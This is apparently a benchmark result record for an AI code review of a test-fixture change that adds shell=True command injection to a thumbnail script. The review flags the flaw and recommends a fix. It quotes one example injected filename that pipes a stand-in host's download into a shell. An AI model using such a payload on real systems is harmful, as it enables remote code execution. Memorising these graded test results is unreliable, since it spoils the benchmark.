@@ -1,0 +1,95 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "7695481624f1",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 57.5,
+  "setup_seconds": 0.0,
+  "total_seconds": 57.5,
+  "usage": {
+    "in": 31931,
+    "cache_read": 88704,
+    "cache_write": 0,
+    "out": 3243,
+    "source": "cli"
+  },
+  "cost_usd": 0.1099312,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "critical",
+      "body": "`subprocess.run(..., shell=True)` with an f-string interpolating `upload_dir`, `name`, and `oid` is command injection. A crafted filename such as `a.png; curl evil.test | sh` (or `$(...)` / backticks) is interpreted by the shell before ImageMagick runs, giving arbitrary command execution as the service user.\n\nImageMagick 7 policy/delegates do not require a shell \u2014 they apply to the `convert`/`magick` process whether it is exec'd directly or via `sh -c`. Keep the argv-list form (and prefer `/usr/bin/magick` or `/usr/bin/convert` if the binary name changed under IM7):\n\n```suggestion\n    subprocess.run(\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n    )\n```\n\nAlso restore the absolute binary path; bare `convert` is PATH-dependent and weaker on multi-user hosts."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a critical command-injection vulnerability by switching thumbnail conversion from an argv list to `shell=True` with unescaped interpolation of `upload_dir`, `name`, and `oid`.\n\n## Analysis\n\nThe previous call was already the correct, safe form:\n\n```python\nsubprocess.run(\n    [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n    check=True,\n)\n```\n\nPassing a fixed argv list means the kernel execs ImageMagick directly; metacharacters in filenames never reach a shell. The new form builds a single shell string and enables `shell=True`, so any of those three values can inject operators (`;`, `|`, `$(...)`, backticks, spaces, quotes).\n\nThe justification comment (\"shell form needed for the imagemagick policy delegate\") does not hold: ImageMagick 7 policy/`delegate.xml` constraints apply regardless of how the process is spawned. If IM7 renamed the binary, the fix is to call `magick` (or `/usr/bin/magick`) still as an argv list \u2014 shell form is unnecessary.\n\nSecondary regressions in the same hunk:\n\n- Absolute path `/usr/bin/convert` was dropped for bare `convert` (PATH-dependent, easier to hijack on a shared runner).\n- The upstream-validation note was removed, which made the residual trust boundary explicit; even with a regex on `name`, `upload_dir` and `oid` remain attacker-influenced in many upload pipelines and are now shell-interpreted.\n\n## Recommendation\n\nRevert to argv-list `subprocess.run` (no `shell=True`). If ImageMagick 7 is required, use something like `[\"/usr/bin/magick\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"]` (or the distro path to `convert`), still with `shell=False`.\n\n**Recommendation:** request-changes",
+  "round": "full",
+  "effective_max_turns": 30,
+  "budget": {
+    "tier": "standard",
+    "profile": "fixed",
+    "turns": 30,
+    "alias": "balanced",
+    "model": "grok-4.5",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 30,
+    "patch_bytes": 120000,
+    "native_cap_applied": false
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The head code runs `subprocess.run` with `shell=True` and an f-string that interpolates `upload_dir`, `name`, and `oid`, so metacharacters in those values are interpreted by the shell. Base used a safe argv list without a shell; the regression is real and severity critical is appropriate."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 8.417,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 3060,
+      "out": 398
+    },
+    "cost_usd": 0.009404
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
